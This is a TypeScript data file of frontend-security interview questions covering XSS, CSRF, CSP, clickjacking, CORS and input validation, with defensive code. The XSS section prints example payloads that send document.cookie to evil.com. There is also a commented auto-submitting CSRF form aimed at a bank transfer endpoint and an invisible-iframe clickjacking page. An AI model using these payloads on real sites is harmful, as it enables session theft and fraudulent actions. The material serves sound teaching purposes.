import type { Topic } from "../../types";

export const securityTopics: Topic[] = [
  {
    id: "web-security-attacks",
    title: "Web Security Attacks & Prevention",
    description:
      "Understanding critical web security vulnerabilities including XSS, CSRF, clickjacking, and injection attacks with their prevention strategies.",
    category: "Security",
    difficulty: "Advanced",
    tags: [
      "XSS",
      "CSRF",
      "clickjacking",
      "injection",
      "web-security",
      "vulnerabilities",
    ],
    overview:
      "Web security is a critical concern for frontend developers. Understanding common attack vectors — how they work, their impact, and how to prevent them — is essential for building applications that protect user data, maintain trust, and comply with security standards. The most prevalent frontend security threats are Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and clickjacking.",
    concepts: [
      "XSS injects malicious scripts into web pages viewed by other users",
      "CSRF tricks authenticated users into performing unintended actions",
      "Clickjacking overlays invisible frames to hijack user clicks",
      "Input validation prevents malicious data from entering the system",
      "Output encoding prevents injected data from being interpreted as code",
      "Content Security Policy restricts which resources browsers can load",
    ],
    codeExamples: [
      {
        title: "XSS Prevention with Output Encoding",
        code: `// VULNERABLE: directly inserting user input into HTML
element.innerHTML = userInput; // XSS vulnerability!

// SAFE: use textContent for text-only content
element.textContent = userInput;

// SAFE: React auto-escapes by default
function Comment({ text }: { text: string }) {
  return <p>{text}</p>; // React escapes HTML entities
}

// DANGEROUS: dangerouslySetInnerHTML bypasses React's protection
function RawHtml({ html }: { html: string }) {
  // Only use with sanitized content!
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}`,
        language: "typescript",
        explanation:
          "React auto-escapes JSX expressions, but innerHTML and dangerouslySetInnerHTML bypass this protection. Always sanitize before rendering raw HTML.",
      },
      {
        title: "CSRF Token Implementation",
        code: `// Server generates CSRF token and includes it in the page
// <meta name="csrf-token" content="abc123..." />

function getCSRFToken(): string {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta?.getAttribute('content') ?? '';
}

async function secureFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': getCSRFToken(),
      'Content-Type': 'application/json',
    },
    credentials: 'same-origin',
  });
}`,
        language: "typescript",
        explanation:
          "CSRF tokens are unique per session and included in state-changing requests. The server validates the token before processing the request.",
      },
    ],
    relatedTopicIds: ["security-headers-auth"],
    questions: [
      {
        id: "sec-1",
        question:
          "What is Cross-Site Scripting (XSS)? Explain stored, reflected, and DOM-based XSS with examples and prevention strategies.",
        answer: `Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. It is consistently ranked among the top web security threats by OWASP. When an application includes untrusted data in its output without proper validation or encoding, an attacker can execute arbitrary JavaScript in the context of another user's browser session, potentially stealing session tokens, cookies, personal data, or performing actions on behalf of the victim.

**Definition & Attack Scenario:** XSS exploits the trust a user has in a particular website. When a user visits a page with injected malicious script, their browser executes it because it appears to come from a trusted source. The impact ranges from session hijacking and cookie theft to keylogging, phishing, and complete account takeover. There are three primary types, each with a different injection mechanism.

**Stored XSS** is the most dangerous variant. The malicious script is permanently stored on the target server — in a database, comment field, forum post, or user profile. Every user who views the stored content executes the malicious script. Example: An attacker submits a comment containing \`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`. This is stored in the database and rendered to every user who views the comment thread, silently sending their session cookies to the attacker's server. The impact is severe because it affects multiple users automatically with no further action from the attacker.

**Reflected XSS** occurs when user input from the current HTTP request is included in the server's response without sanitization. The malicious script is "reflected" off the server — typically via URL parameters, search queries, or error messages. The attacker crafts a malicious URL and tricks the victim into clicking it (via email, social media, or embedded links). Example: A search page at \`/search?q=<script>document.location='https://evil.com/'+document.cookie</script>\` that displays "Results for: [query]" without encoding would execute the script. Unlike stored XSS, reflected XSS requires the victim to click a specific crafted link.

**DOM-based XSS** occurs entirely in the client-side JavaScript without the malicious payload ever reaching the server. The vulnerability exists when JavaScript reads data from an attacker-controllable source (like location.hash, location.search, or document.referrer) and passes it to a dangerous sink (like innerHTML, document.write, or eval). Example: \`document.getElementById('output').innerHTML = location.hash.substring(1)\` — an attacker sends a link with \`#<img src=x onerror=alert(document.cookie)>\` and the browser executes the script.

**Prevention** requires a layered approach. First, encode all output: HTML-encode when inserting into HTML context, JavaScript-encode for JavaScript context, URL-encode for URL context. React provides automatic XSS protection by escaping JSX expressions, but dangerouslySetInnerHTML, href with javascript: protocol, and server-rendered markup bypass this. Second, implement Content Security Policy (CSP) headers to restrict which scripts can execute. Third, sanitize any HTML that must be rendered raw using libraries like DOMPurify. Fourth, use HttpOnly cookies to prevent JavaScript access to session tokens even if XSS occurs. Fifth, validate and sanitize input on both client and server sides.`,
        shortAnswer:
          "XSS injects malicious scripts into web pages. Stored XSS persists in the database and affects all viewers. Reflected XSS bounces off server responses via crafted URLs. DOM-based XSS executes entirely client-side via unsafe JavaScript sinks. Prevent with output encoding, CSP headers, DOMPurify for raw HTML, HttpOnly cookies, and input validation.",
        code: `// STORED XSS: Malicious comment saved to database
// Attacker submits:
const maliciousComment = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
// Every viewer executes this script

// REFLECTED XSS: Malicious URL parameter
// URL: /search?q=<script>alert(document.cookie)</script>
// Server renders: "You searched for: <script>alert(document.cookie)</script>"

// DOM-BASED XSS: Client-side vulnerability
// VULNERABLE CODE:
document.getElementById('output')!.innerHTML = location.hash.substring(1);
// Attacker URL: https://example.com/page#<img src=x onerror=stealCookies()>

// PREVENTION 1: React's automatic escaping
function SafeComment({ text }: { text: string }) {
  return <p>{text}</p>; // <script> tags are rendered as text, not executed
}

// PREVENTION 2: DOMPurify for raw HTML
import DOMPurify from 'dompurify';

function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// PREVENTION 3: Validate href to prevent javascript: protocol XSS
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const isValidUrl = /^https?:\\/\\//i.test(href);
  return isValidUrl ? <a href={href}>{children}</a> : <span>{children}</span>;
}

// PREVENTION 4: CSP Header (server-side)
// Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`,
        language: "typescript",
        difficulty: "Advanced",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "XSS",
          "stored-XSS",
          "reflected-XSS",
          "DOM-XSS",
          "sanitization",
          "CSP",
        ],
        commonMistakes: [
          'Trusting React to prevent all XSS — dangerouslySetInnerHTML and href="javascript:" bypass protection',
          "Only sanitizing on the client side — server-side encoding is also essential",
          "Using a blocklist approach (filtering <script>) instead of allowlist (permitting safe tags only)",
          "Assuming URL parameters are safe because they come from your own site",
        ],
        followUps: [
          "How does Content Security Policy prevent XSS even if injection occurs?",
          "What is the difference between input validation and output encoding?",
          "How does React's JSX escaping work under the hood?",
        ],
        interviewTips: [
          "Explain all three XSS types with concrete attack scenarios",
          "Show layered defense: encoding + CSP + sanitization + HttpOnly cookies",
          "Mention that XSS is consistently in the OWASP Top 10 to show awareness of industry standards",
        ],
      },
      {
        id: "sec-2",
        question:
          "What is CSRF (Cross-Site Request Forgery)? How does it work and what are the prevention mechanisms?",
        answer: `**Definition:** Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to perform unintended actions on a web application where they're currently authenticated. Unlike XSS which exploits the trust a user has in a website, CSRF exploits the trust a website has in the user's browser — specifically, the browser's automatic inclusion of cookies (including session cookies) with every request to a domain.

**Attack Scenario:** Consider a banking application where transferring money requires a POST request to \`/api/transfer\` with parameters for recipient and amount. The user is logged in and has a valid session cookie. The attacker creates a malicious webpage containing a hidden form that auto-submits a transfer request to the bank's API. When the victim visits the attacker's page (perhaps via a phishing email link), their browser automatically sends the request with the bank's session cookie attached. The bank's server sees a valid session cookie and processes the transfer — the user has no idea it happened.

**Example attack page:**
The attacker's page contains a form with \`action="https://bank.com/api/transfer"\` and hidden fields for \`recipient=attacker&amount=10000\`. A small JavaScript snippet auto-submits the form on page load. The browser sends the request with the victim's bank session cookie because the request targets bank.com. The bank's server cannot distinguish this forged request from a legitimate one.

**Impact:** CSRF can lead to unauthorized fund transfers, email address changes, password changes, data deletion, or any state-changing action the authenticated user can perform. It's particularly dangerous because it operates silently and requires no JavaScript execution on the target site — even a simple img tag can trigger a GET-based CSRF attack.

**Prevention** uses multiple complementary strategies. CSRF tokens (synchronizer tokens) are the primary defense: the server generates a unique, unpredictable token per session (or per request) and embeds it in forms. Every state-changing request must include this token, which the server validates. Since the attacker's page can't read the target site's DOM (same-origin policy), they can't obtain the CSRF token. SameSite cookies (SameSite=Strict or SameSite=Lax) prevent the browser from sending cookies on cross-origin requests. Double-submit cookies send the CSRF token both as a cookie and as a request header/body — the server verifies they match. Origin/Referer header checking validates that the request originated from the expected domain. Modern frameworks like Next.js and Express include CSRF protection middleware.`,
        shortAnswer:
          "CSRF tricks authenticated users into making unintended requests by exploiting automatic cookie inclusion. An attacker creates a page that submits a forged request to the target site, and the browser attaches the victim's session cookie automatically. Prevent with CSRF tokens, SameSite cookies, double-submit cookies, and Origin header validation.",
        code: `// CSRF Attack: Attacker's malicious page
// <form id="attack" action="https://bank.com/api/transfer" method="POST">
//   <input type="hidden" name="recipient" value="attacker-account" />
//   <input type="hidden" name="amount" value="10000" />
// </form>
// <script>document.getElementById('attack').submit();</script>
// The victim's session cookie is automatically sent!

// PREVENTION 1: CSRF Token
// Server embeds token in page: <meta name="csrf-token" content="xyz..." />
function getCsrfToken(): string {
  return document.querySelector('meta[name="csrf-token"]')
    ?.getAttribute('content') ?? '';
}

async function securePost<T>(url: string, data: T): Promise<Response> {
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCsrfToken(),
    },
    credentials: 'same-origin',
    body: JSON.stringify(data),
  });
}

// PREVENTION 2: SameSite Cookie (server-side)
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// PREVENTION 3: Double-submit cookie pattern
// The CSRF token is sent both as a cookie and a header
// Server verifies: cookie token === header token
async function doubleSubmitFetch(url: string, options: RequestInit = {}) {
  const csrfCookie = document.cookie
    .split('; ')
    .find(c => c.startsWith('csrf='))
    ?.split('=')[1] ?? '';

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfCookie,
    },
  });
}

// PREVENTION 4: Verify Origin header (server middleware)
// function csrfMiddleware(req, res, next) {
//   const origin = req.headers.origin || req.headers.referer;
//   if (!origin || !allowedOrigins.includes(new URL(origin).origin)) {
//     return res.status(403).json({ error: 'Invalid origin' });
//   }
//   next();
// }`,
        language: "typescript",
        difficulty: "Advanced",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "CSRF",
          "session-security",
          "SameSite",
          "CSRF-token",
          "authentication",
        ],
        commonMistakes: [
          "Relying only on CORS for CSRF protection — CORS doesn't prevent form submissions",
          "Using CSRF tokens in GET requests — tokens in URLs can leak via Referer headers",
          "Not using SameSite=Strict or Lax on session cookies",
          "Assuming SPA architecture alone prevents CSRF — API endpoints still need protection",
        ],
        followUps: [
          "How does SameSite=Lax differ from SameSite=Strict?",
          "Why doesn't CORS prevent CSRF attacks?",
          "How do SPAs handle CSRF differently from server-rendered apps?",
        ],
        interviewTips: [
          "Clearly explain the mechanism: browser sends cookies automatically, attacker exploits this",
          "Distinguish CSRF from XSS — they exploit different trust relationships",
          "Show multiple prevention layers: tokens + SameSite + Origin checking",
        ],
      },
      {
        id: "sec-3",
        question:
          "What is Content Security Policy (CSP) and how does it protect against attacks?",
        answer: `**Definition:** Content Security Policy (CSP) is a security HTTP response header that allows web developers to control which resources (scripts, styles, images, fonts, frames) the browser is allowed to load and execute for a given page. It acts as a whitelist of trusted content sources, providing a powerful defense-in-depth layer against XSS, data injection, and clickjacking attacks.

**Attack Scenario CSP Prevents:** Without CSP, if an attacker manages to inject a script tag via XSS (e.g., through a stored XSS vulnerability in a comment field), the browser executes it without question because there's no policy restricting which scripts can run. With a CSP like \`script-src 'self'\`, the browser blocks any script that doesn't originate from the same domain — even if the injected script tag exists in the HTML, it won't execute. This makes CSP a critical second line of defense when input sanitization fails.

**Example:** A CSP header \`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; frame-ancestors 'none'\` tells the browser: only load scripts from the same origin or cdn.example.com, allow inline styles (but not inline scripts), allow images from any domain, and don't allow this page to be framed at all (preventing clickjacking).

**Impact:** CSP significantly reduces the impact of XSS vulnerabilities even when they exist. Without CSP, a successful XSS attack can load external scripts, exfiltrate data to any domain, and embed the page in attacker frames. With a strict CSP, the attacker's injected code is severely limited — they can't load external scripts, can't send data to unauthorized domains, and the page can't be framed. CSP violation reports (via report-uri or report-to directives) also alert you to potential attacks in real time.

**Prevention and Implementation:** Start with \`Content-Security-Policy-Report-Only\` to test your policy without breaking anything — violations are reported but not enforced. Gradually tighten the policy by adding specific source directives: script-src for JavaScript, style-src for CSS, img-src for images, connect-src for fetch/XHR destinations, font-src for fonts, and frame-ancestors to control who can embed your page. Use nonces or hashes instead of 'unsafe-inline' for necessary inline scripts. The strictest practical policy is \`script-src 'nonce-{random}'\` combined with \`strict-dynamic\` which allows nonced scripts to load additional scripts.`,
        shortAnswer:
          "CSP is an HTTP header that whitelists trusted content sources. It prevents XSS by blocking unauthorized scripts even if injection occurs, stops data exfiltration by restricting connect-src, and prevents clickjacking via frame-ancestors. Use Report-Only mode first, then enforce. Prefer nonces over unsafe-inline for inline scripts.",
        code: `// Basic CSP header examples

// Strict CSP: only same-origin scripts with nonces
// Content-Security-Policy:
//   default-src 'self';
//   script-src 'nonce-abc123' 'strict-dynamic';
//   style-src 'self' 'nonce-abc123';
//   img-src 'self' data: https:;
//   font-src 'self' https://fonts.gstatic.com;
//   connect-src 'self' https://api.example.com;
//   frame-ancestors 'none';
//   base-uri 'self';
//   form-action 'self';
//   report-uri /api/csp-report;

// HTML with nonce-based CSP
// <script nonce="abc123">
//   console.log('This script runs because it has the correct nonce');
// </script>
// <script>
//   console.log('This script is BLOCKED - no nonce');
// </script>

// Meta tag CSP (limited - no report-uri or frame-ancestors)
// <meta http-equiv="Content-Security-Policy"
//   content="default-src 'self'; script-src 'self'">

// Express.js CSP middleware with helmet
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => \`'nonce-\${res.locals.nonce}'\`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
    },
    reportOnly: false,
  })
);

// Report-Only mode for testing
// Content-Security-Policy-Report-Only:
//   default-src 'self'; report-uri /api/csp-report;

// CSP violation report handler
app.post('/api/csp-report', (req, res) => {
  const report = req.body['csp-report'];
  console.warn('CSP Violation:', {
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
  });
  res.status(204).end();
});`,
        language: "typescript",
        difficulty: "Advanced",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "CSP",
          "Content-Security-Policy",
          "security-headers",
          "XSS-prevention",
          "nonce",
        ],
        commonMistakes: [
          "Using unsafe-inline and unsafe-eval which defeat CSP's XSS protection purpose",
          "Not starting with Report-Only mode, breaking the site with an overly strict initial policy",
          "Setting CSP too loosely (allowing *.example.com) which can be bypassed",
          "Forgetting to include all required source domains, breaking legitimate functionality",
        ],
        followUps: [
          "What is the difference between nonce-based and hash-based CSP?",
          "How does strict-dynamic simplify CSP deployment?",
          "What are the limitations of CSP set via meta tags vs. HTTP headers?",
        ],
        interviewTips: [
          "Explain CSP as a defense-in-depth layer — it doesn't replace input sanitization",
          "Mention the deployment strategy: Report-Only → gradual tightening → enforcement",
          "Know the key directives: script-src, connect-src, frame-ancestors",
        ],
      },
      {
        id: "sec-4",
        question: "What is clickjacking and how do you prevent it?",
        answer: `**Definition:** Clickjacking (also called UI redress attack) is a technique where an attacker tricks a user into clicking on something different from what they perceive they're clicking on. The attacker creates a malicious page that loads the target website in a transparent or disguised iframe, overlaying it with deceptive content. When the user thinks they're clicking a button on the attacker's page, they're actually clicking a button on the hidden target site.

**Attack Scenario:** An attacker wants to trick users into changing their email settings on a social media site. They create a page advertising a free prize with a "Claim Prize" button. Behind this visible page, they load the target site's settings page in an invisible iframe, positioned so the "Save Changes" button aligns exactly with the "Claim Prize" button. The iframe has a pre-filled email change form (using URL parameters or stored preferences). When the user clicks "Claim Prize," they actually click "Save Changes" on the real site, changing their email to the attacker's address — potentially enabling an account takeover via password reset.

**Example:** The attacker's page uses CSS to make the iframe invisible: \`<iframe src="https://target.com/settings" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>\`. The iframe loads the real page with the user's real session. The page underneath shows fake UI elements positioned to align with clickable elements in the invisible iframe.

**Impact:** Clickjacking can lead to unauthorized actions including changing account settings, making purchases, enabling camera/microphone access (via browser permission dialogs), liking/sharing content on social media, or clicking ads for click fraud. In severe cases, it enables multi-step attacks where each click performs a different action, gradually achieving complex unauthorized operations like money transfers.

**Prevention** relies on several complementary mechanisms. The X-Frame-Options header tells browsers whether the page can be displayed in a frame. \`DENY\` prevents all framing, \`SAMEORIGIN\` allows framing only by the same origin. CSP's frame-ancestors directive is the modern replacement: \`frame-ancestors 'none'\` is equivalent to X-Frame-Options: DENY but more flexible — you can whitelist specific origins that are allowed to frame your page. For JavaScript-based protection, frame-busting scripts detect when a page is loaded in an iframe and break out: \`if (window.top !== window.self) { window.top.location = window.self.location; }\`. However, frame-busting can be defeated by sandbox attributes, so HTTP headers are the reliable defense.`,
        shortAnswer:
          "Clickjacking loads a target site in a transparent iframe, tricking users into clicking hidden elements. Attackers overlay deceptive UI that aligns with real buttons on the hidden page. Prevent with X-Frame-Options: DENY, CSP frame-ancestors 'none', and frame-busting JavaScript. HTTP headers are the most reliable defense.",
        code: `// ATTACK: Attacker's clickjacking page
// <style>
//   iframe {
//     position: absolute; top: 0; left: 0;
//     width: 100%; height: 100%;
//     opacity: 0;          /* invisible iframe */
//     z-index: 2;          /* on top of decoy content */
//   }
//   .decoy-button {
//     position: absolute;
//     top: 340px; left: 520px; /* aligned with target button */
//   }
// </style>
// <iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
// <button class="decoy-button">Claim Free Prize!</button>

// PREVENTION 1: X-Frame-Options header (server)
// X-Frame-Options: DENY
// or
// X-Frame-Options: SAMEORIGIN

// PREVENTION 2: CSP frame-ancestors (modern replacement)
// Content-Security-Policy: frame-ancestors 'none'
// or allow specific trusted origins:
// Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com

// Express.js setup
import helmet from 'helmet';

app.use(helmet.frameguard({ action: 'deny' }));
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      frameAncestors: ["'none'"],
    },
  })
);

// PREVENTION 3: Frame-busting JavaScript (fallback)
if (window.top !== window.self) {
  window.top!.location.href = window.self.location.href;
}

// More robust frame-busting
(function preventClickjacking() {
  if (self === top) {
    const body = document.body;
    if (body) body.style.display = 'block';
  } else {
    top!.location = self.location;
  }
})();

// CSS fallback: hide content when framed
// <style>body { display: none; }</style>
// JavaScript reveals content only when not framed`,
        language: "typescript",
        difficulty: "Intermediate",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "clickjacking",
          "iframe",
          "X-Frame-Options",
          "frame-ancestors",
          "UI-redress",
        ],
        commonMistakes: [
          "Relying only on JavaScript frame-busting which can be defeated by sandbox attributes",
          "Using X-Frame-Options but not CSP frame-ancestors — modern browsers prefer CSP",
          "Setting SAMEORIGIN when the page should never be framed (use DENY instead)",
          "Forgetting to protect sensitive action pages like settings, payment, and account management",
        ],
        followUps: [
          "What is the difference between X-Frame-Options and CSP frame-ancestors?",
          "How can sandbox attributes on iframes defeat frame-busting scripts?",
          "What is a cursor-jacking attack?",
        ],
        interviewTips: [
          "Draw the visual: invisible iframe over decoy UI makes the attack concept clear",
          "Show the progression from JavaScript frame-busting to HTTP headers",
          "Mention that frame-ancestors in CSP is the modern, recommended approach",
        ],
      },
      {
        id: "sec-5",
        question:
          "What is CORS and how does it relate to web security? Explain preflight requests and common CORS misconfigurations.",
        answer: `**Definition:** Cross-Origin Resource Sharing (CORS) is a security mechanism that allows servers to declare which origins (domain, protocol, port) are permitted to access their resources via browser-initiated HTTP requests. It relaxes the Same-Origin Policy (SOP), which by default prevents web pages from making requests to domains different from the one that served the page. CORS is enforced by browsers, not servers — the server sends CORS headers, and the browser decides whether to allow the frontend code to access the response.

**Attack Scenario CORS Prevents:** Without CORS and the Same-Origin Policy, any website could make authenticated requests to any other website. A malicious page at evil.com could use fetch to call bank.com's API with the user's cookies, read the response containing account data, and exfiltrate it. CORS prevents this by requiring bank.com to explicitly opt in to allowing requests from evil.com via the Access-Control-Allow-Origin header. If bank.com doesn't include evil.com in its allowed origins, the browser blocks the JavaScript from reading the response.

**Example:** When a frontend at \`https://app.example.com\` makes a fetch request to \`https://api.example.com/data\`, the browser adds an Origin header to the request. The API server responds with \`Access-Control-Allow-Origin: https://app.example.com\`. The browser compares the Origin with the allowed origin — if they match, JavaScript can access the response. For "simple" requests (GET/POST with standard headers), this check happens after the request. For "complex" requests (PUT/DELETE, custom headers, non-standard content types), the browser sends a preflight OPTIONS request first to check permissions before sending the actual request.

**Impact of Misconfigurations:** The most dangerous CORS misconfiguration is \`Access-Control-Allow-Origin: *\` combined with \`Access-Control-Allow-Credentials: true\` — this would allow any website to make authenticated requests and read the response. Fortunately, browsers explicitly block this combination. However, a common vulnerability is dynamically reflecting the Origin header value into Access-Control-Allow-Origin without validation. An attacker's origin is reflected, granting their site access to authenticated API responses. Always validate origins against a strict allowlist.

**Prevention:** Maintain a strict allowlist of permitted origins and validate against it. Never reflect the Origin header without checking it against the allowlist. Avoid \`Access-Control-Allow-Origin: *\` for APIs that use cookies or authentication. Limit \`Access-Control-Allow-Methods\` to only the HTTP methods your API actually uses. Set \`Access-Control-Max-Age\` to cache preflight responses and reduce OPTIONS request overhead. For APIs that don't need cross-origin access, don't set CORS headers at all — the default Same-Origin Policy is the most secure option.`,
        shortAnswer:
          "CORS allows servers to declare which origins can access their resources, relaxing the Same-Origin Policy. Browsers enforce CORS by checking Access-Control-Allow-Origin headers. Preflight OPTIONS requests check permissions before complex cross-origin requests. Misconfiguring CORS (reflecting arbitrary origins, using wildcard with credentials) creates serious security holes.",
        code: `// Express CORS configuration
import cors from 'cors';

const allowedOrigins = [
  'https://app.example.com',
  'https://staging.example.com',
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  credentials: true,
  maxAge: 86400, // cache preflight for 24 hours
}));

// DANGEROUS: reflecting origin without validation
// DON'T DO THIS:
// res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
// res.setHeader('Access-Control-Allow-Credentials', 'true');
// This allows ANY website to make authenticated requests!

// Preflight request/response flow:
// 1. Browser sends OPTIONS (preflight):
//    OPTIONS /api/data
//    Origin: https://app.example.com
//    Access-Control-Request-Method: PUT
//    Access-Control-Request-Headers: Content-Type, Authorization

// 2. Server responds with allowed methods/headers:
//    Access-Control-Allow-Origin: https://app.example.com
//    Access-Control-Allow-Methods: GET, POST, PUT
//    Access-Control-Allow-Headers: Content-Type, Authorization
//    Access-Control-Max-Age: 86400

// 3. Browser sends actual request (only if preflight succeeds)

// Frontend: handle CORS errors gracefully
async function fetchData(url: string): Promise<Response> {
  try {
    const response = await fetch(url, { credentials: 'include' });
    return response;
  } catch (error) {
    if (error instanceof TypeError && error.message.includes('CORS')) {
      console.error('CORS error: Check server Access-Control headers');
    }
    throw error;
  }
}`,
        language: "typescript",
        difficulty: "Advanced",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "CORS",
          "same-origin-policy",
          "preflight",
          "Access-Control",
          "cross-origin",
        ],
        commonMistakes: [
          "Using Access-Control-Allow-Origin: * for APIs that require authentication",
          "Reflecting the request Origin header without validating against an allowlist",
          "Thinking CORS is enforced by the server — it's enforced by the browser",
          "Not handling preflight caching (Access-Control-Max-Age), causing excessive OPTIONS requests",
        ],
        followUps: [
          "What requests trigger a preflight and what don't?",
          "How does CORS interact with cookies and credentials?",
          "What is the difference between CORS and Same-Origin Policy?",
        ],
        interviewTips: [
          "Emphasize that CORS is browser-enforced, not server-enforced",
          "Walk through the preflight flow: OPTIONS → server responds → browser decides → actual request",
          "Highlight the most dangerous misconfiguration: reflecting arbitrary origins with credentials",
        ],
      },
      {
        id: "sec-6",
        question:
          "Explain input validation and output encoding. Why do you need both for secure applications?",
        answer: `**Definition:** Input validation is the process of verifying that user-supplied data conforms to expected formats, types, lengths, and business rules before processing it. Output encoding (also called output escaping) is the process of transforming data so it's treated as content rather than executable code when inserted into different output contexts (HTML, JavaScript, CSS, URLs). Together, they form a defense-in-depth strategy against injection attacks.

**Attack Scenario:** Without input validation, an attacker can submit a form field containing \`<script>alert('XSS')</script>\` where a name is expected. Without output encoding, when this "name" is displayed on a page using innerHTML, the browser executes the script. Input validation would reject the input because names don't contain angle brackets. Output encoding would convert \`<\` to \`&lt;\` when rendering, preventing the browser from interpreting it as HTML. Either defense alone can fail — validation might miss an edge case, or encoding might be forgotten in one output location. Both together provide layered protection.

**Example:** A registration form expects an email address. Input validation checks: Is it non-empty? Does it match an email regex pattern? Is it under 254 characters? Does the domain have MX records? This rejects obvious attacks like SQL injection strings or script tags in the email field. When the email is later displayed on a profile page, output encoding ensures that even if a malicious string somehow passed validation, it's rendered as text, not executed as code. Different output contexts require different encoding: HTML encoding for page content, URL encoding for query parameters, JavaScript encoding for inline scripts, CSS encoding for style attributes.

**Impact:** Input validation without output encoding is insufficient because validation is hard to get right — there are always edge cases, encoding tricks, and novel bypass techniques. A WAF (Web Application Firewall) or validation rule that blocks \`<script>\` can be bypassed with \`<img onerror=...>\` or Unicode tricks. Output encoding without input validation is also insufficient because it doesn't prevent business logic issues — a user could submit a 10MB string, a negative price, or a date in the year 3000. Both are necessary for different reasons: validation for data integrity and business rules, encoding for preventing injection.

**Prevention best practices:** Validate on both client (for UX) and server (for security) — never trust client-side validation alone. Use allowlist validation (only permit known-good patterns) rather than blocklist validation (trying to filter known-bad patterns). For output encoding, use context-appropriate encoding functions and rely on framework-provided auto-escaping (React's JSX, template engines' default encoding). Never use innerHTML, eval, or document.write with user data. Parameterize database queries to prevent SQL injection. Use TypeScript's type system to enforce data shapes at compile time as an additional validation layer.`,
        shortAnswer:
          "Input validation verifies data conforms to expected formats before processing. Output encoding transforms data to prevent interpretation as code when rendered. Both are needed: validation prevents bad data and business logic issues, encoding prevents injection even if validation misses an edge case. Validate server-side with allowlists; encode based on output context.",
        code: `// INPUT VALIDATION: Server and client
import { z } from 'zod';

const UserSchema = z.object({
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name too long')
    .regex(/^[a-zA-Z\\s'-]+$/, 'Name contains invalid characters'),
  email: z.string()
    .email('Invalid email format')
    .max(254, 'Email too long'),
  age: z.number()
    .int('Age must be an integer')
    .min(13, 'Must be 13 or older')
    .max(150, 'Invalid age'),
  bio: z.string()
    .max(1000, 'Bio too long')
    .optional(),
});

type UserInput = z.infer<typeof UserSchema>;

function validateUser(input: unknown): UserInput {
  return UserSchema.parse(input); // throws ZodError if invalid
}

// React form with validation
function RegistrationForm() {
  const handleSubmit = (formData: FormData) => {
    try {
      const user = validateUser({
        name: formData.get('name'),
        email: formData.get('email'),
        age: Number(formData.get('age')),
      });
      submitToApi(user);
    } catch (error) {
      if (error instanceof z.ZodError) {
        setErrors(error.flatten().fieldErrors);
      }
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input name="name" pattern="[a-zA-Z\\s'-]+" required />
      <input name="email" type="email" required />
      <input name="age" type="number" min="13" max="150" required />
    </form>
  );
}

// OUTPUT ENCODING: context-appropriate escaping
function encodeForHTML(str: string): string {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
  // < becomes &lt;  > becomes &gt;  & becomes &amp;
}

function encodeForURL(str: string): string {
  return encodeURIComponent(str);
}

// React auto-encodes JSX expressions (SAFE)
function UserProfile({ name }: { name: string }) {
  return <h1>{name}</h1>; // Auto-escaped, XSS-safe
}

// UNSAFE: bypasses encoding
function UnsafeProfile({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />; // NO encoding!
}`,
        language: "typescript",
        difficulty: "Intermediate",
        type: "Conceptual",
        category: "Security",
        topicId: "web-security-attacks",
        tags: [
          "input-validation",
          "output-encoding",
          "sanitization",
          "zod",
          "XSS-prevention",
        ],
        commonMistakes: [
          "Only validating on the client side — client validation can be bypassed entirely",
          "Using blocklist validation (filter bad patterns) instead of allowlist (permit good patterns)",
          "Applying the same encoding for all contexts — HTML, URL, and JS require different encoding",
          "Trusting framework auto-escaping without understanding where it doesn't apply",
        ],
        followUps: [
          "How do you validate file uploads securely?",
          "What is the difference between sanitization and validation?",
          "How does Zod compare to Yup for schema validation?",
        ],
        interviewTips: [
          "Explain why both are needed: validation for data quality, encoding for injection prevention",
